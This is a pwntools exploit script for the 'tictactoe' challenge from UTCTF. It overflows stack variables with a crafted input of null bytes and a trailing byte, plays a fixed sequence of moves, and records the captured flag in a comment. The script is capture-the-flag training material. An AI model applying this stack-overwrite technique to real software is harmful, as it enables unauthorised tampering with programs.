#!/usr/bin/env python3

from pwn import *

exe = ELF('tictactoe', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+104
        b*main+2849
        c
        ''')
        # input()
        # p = gdb.debug([exe.path],"""
        #     # b*main+104
        #     c
        #     """)
        # return p
        # input()


if args.REMOTE:
    p = remote('challenge.utctf.live', 7114)
else:
    p = process([exe.path])
GDB()

  # _BYTE opt[2]; // [rsp+9h] [rbp-47h] BYREF
  # _BYTE v11[2]; // [rsp+Bh] [rbp-45h] BYREF
  # _BYTE v12[7]; // [rsp+Dh] [rbp-43h] BYREF
  # int v13; // [rsp+14h] [rbp-3Ch]
  # __int64 v14; // [rsp+18h] [rbp-38h]
  # __int64 v15; // [rsp+20h] [rbp-30h]
  # __int64 v16; // [rsp+28h] [rbp-28h]
  # int v17; // [rsp+30h] [rbp-20h]
  # int v18; // [rsp+38h] [rbp-18h]
  # int v19; // [rsp+3Ch] [rbp-14h]
  # int v20; // [rsp+40h] [rbp-10h]
  # int v21; // [rsp+44h] [rbp-Ch]
  # int v22; // [rsp+48h] [rbp-8h]


bss = 0x0000000000404100
payload = b'o'
payload += b'\00'*60 + b'a'*1
sl(payload)
sl(b'5')
sl(b'3')
sl(b'4')
sl(b'8')

p.interactive()

# utflag{!pr0_g4m3r_4l3rt!}